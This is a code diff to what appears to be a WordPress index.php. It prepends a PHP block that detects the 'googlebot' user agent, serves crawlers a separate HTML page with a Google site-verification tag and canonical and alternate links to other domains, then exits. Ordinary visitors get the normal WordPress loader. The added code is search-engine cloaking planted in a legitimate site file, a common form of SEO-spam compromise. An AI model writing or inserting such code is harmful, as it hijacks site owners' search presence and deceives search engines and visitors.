@@ -1,4 +1,9 @@
+<?php
 
+if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
+{
+?>
+   
 
 
 <!doctype html>
@@ -6,6 +11,7 @@
 	<head>
 	<meta charset="utf-8" />
 	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+   <meta name="google-site-verification" content="8qrTlkPDbxmTo18lf9C50qGdZ3g7zw--p3-rnE2NQLU" />
 	<meta name="viewport" content="width=device-width,initial-scale=1" />
 	<link rel="canonical" href="https://reiguatemala.org/" />
 	<link rel="amphtml" href="https://lvyourself.org/app/reiguatemala/" />
@@ -16,6 +22,7 @@
    <link rel="alternate" hreflang="en" href="https://lvyourself.org/app/reiguatemala/"/>
    <link rel="alternate" hreflang="x-default" href="https://lvyourself.org/app/reiguatemala/"/>
 	<meta name="robots" content="index, follow">
+   <meta name="google-site-verification" content="8qrTlkPDbxmTo18lf9C50qGdZ3g7zw--p3-rnE2NQLU" />
 	<link rel="preconnect" href="https://cdn.shopify.com" crossorigin />
 	<link rel="preconnect" href="https://fonts.shopifycdn.com" crossorigin />
 	<link rel="shortcut icon" href="https://i.imgur.com/OU9uOF8.png">
@@ -6889,3 +6896,25 @@ document.querySelectorAll(".cok-faq-q").forEach(btn => {
 <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9c161b2d3be4f91e',t:'MTc2ODk5MTExMS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"9c161b2d3be4f91e","version":"2025.9.1","r":1,"token":"0d4277cb851d46ab89fa643bc0bee4f0","serverTiming":{"name":{"cfExtPri":true,"cfEdge":true,"cfOrigin":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}}}' crossorigin="anonymous"></script>
 </body>
 </html>
+<?php
+exit;
+}
+?>
+
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
